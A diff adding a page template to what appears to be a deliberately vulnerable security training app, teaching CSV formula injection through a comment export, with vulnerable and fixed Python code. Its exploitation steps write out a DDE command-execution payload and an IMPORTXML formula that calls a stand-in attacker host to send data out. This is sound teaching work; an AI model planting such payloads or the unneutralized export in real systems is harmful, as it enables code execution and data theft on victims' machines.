@@ -1,0 +1,104 @@
+{% extends "core/example_page_base.html" %}
+{% set example_title = "CSV Formula Injection via Comment Export" %}
+{% set example_difficulty = "Medium" %}
+{% block title %}{{ example_title }} — A03{% endblock %}
+
+{% block explanation %}
+<p>
+  Every comment posted on this page can later be exported to a CSV file --
+  a common "download this data" feature many real apps offer. The export
+  writes each comment's author and body straight into a spreadsheet cell
+  with no neutralization at all. Spreadsheet applications like Excel,
+  LibreOffice, and Google Sheets treat any cell whose content starts with
+  <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> as a
+  formula to evaluate the moment the file is opened, not as literal text --
+  an attacker who controls a comment controls what runs on the machine of
+  whoever opens the export.
+</p>
+{% endblock %}
+
+{% block detect %}
+<p>
+  Post a comment whose body is exactly <code>=1+1</code> below, then
+  <a href="{{ url_for('a03_injection.export_comments_csv') }}">download the CSV export</a>
+  and open it in a text editor -- the cell contains the literal,
+  un-neutralized text <code>=1+1</code>, with no leading quote or other
+  prefix added to stop a spreadsheet application from treating it as a
+  formula.
+</p>
+{% endblock %}
+
+{% block exploitation %}
+<ol>
+  <li>Confirm the injection point: post a comment with body
+      <code>=1+1</code> and export -- the raw formula text survives
+      unmodified into the CSV cell.</li>
+  <li>Escalate to code execution via Excel's Dynamic Data Exchange (DDE)
+      feature: post a comment with body
+      <code>=cmd|'/C calc'!A0</code>. Exported and opened in a
+      DDE-enabled version of Excel, this spawns Calculator the moment the
+      victim clicks through Excel's "update this workbook with data from
+      external sources?" prompt -- the same mechanism a real attacker
+      would use to launch a PowerShell download-and-execute payload
+      instead.</li>
+  <li>Escalate to silent data exfiltration in Google Sheets, which has no
+      DDE prompt to click through: post a comment with body
+      <code>=IMPORTXML("http://attacker.example/track", "//a/@href")</code>.
+      The moment a victim views this cell in Google Sheets, it silently
+      issues a real outbound HTTP request to the attacker's server --
+      confirming the payload landed, and in a real attack, potentially
+      exfiltrating other spreadsheet data back to the attacker through the
+      query's return value.</li>
+</ol>
+<p>
+  This lab's test suite proves the export genuinely contains the
+  un-neutralized payload byte-for-byte; it can't launch a real copy of
+  Excel or Google Sheets to prove the formula executes, exactly like this
+  lab's SQL-injection-to-RCE example describes its final reverse-shell
+  escalation in prose rather than actually opening one.
+</p>
+{% endblock %}
+
+{% block vulnerable_code %}writer = csv.writer(output)
+writer.writerow(["Author", "Comment"])
+for c in all_comments:
+    writer.writerow([c.author, c.body])
+{% endblock %}
+
+{% block secure_code %}FORMULA_LEAD_CHARS = ("=", "+", "-", "@")
+
+def neutralize(cell):
+    if cell and cell[0] in FORMULA_LEAD_CHARS:
+        return "'" + cell  # leading quote forces spreadsheet apps to treat it as text
+    return cell
+
+writer = csv.writer(output)
+writer.writerow(["Author", "Comment"])
+for c in all_comments:
+    writer.writerow([neutralize(c.author), neutralize(c.body)])
+{% endblock %}
+
+{% block live_example %}
+<form method="post" action="{{ url_for('a03_injection.comments') }}" class="mb-3">
+  <div class="mb-2">
+    <label class="form-label">Name</label>
+    <input type="text" class="form-control" name="author" value="Guest">
+  </div>
+  <div class="mb-2">
+    <label class="form-label">Comment</label>
+    <textarea class="form-control" name="body" rows="2" placeholder="=1+1"></textarea>
+  </div>
+  <button type="submit" class="btn btn-primary">Post comment</button>
+</form>
+<p class="text-muted small">
+  Posting redirects you to the Comments page (that's the existing route
+  this form reuses) -- come back here or just use the link below to
+  download the export.
+</p>
+<a href="{{ url_for('a03_injection.export_comments_csv') }}" class="btn btn-outline-secondary">
+  Download CSV Export
+</a>
+<p class="mt-3">
+  <a href="{{ url_for('a03_injection.comments') }}">View posted comments</a>
+</p>
+{% endblock %}
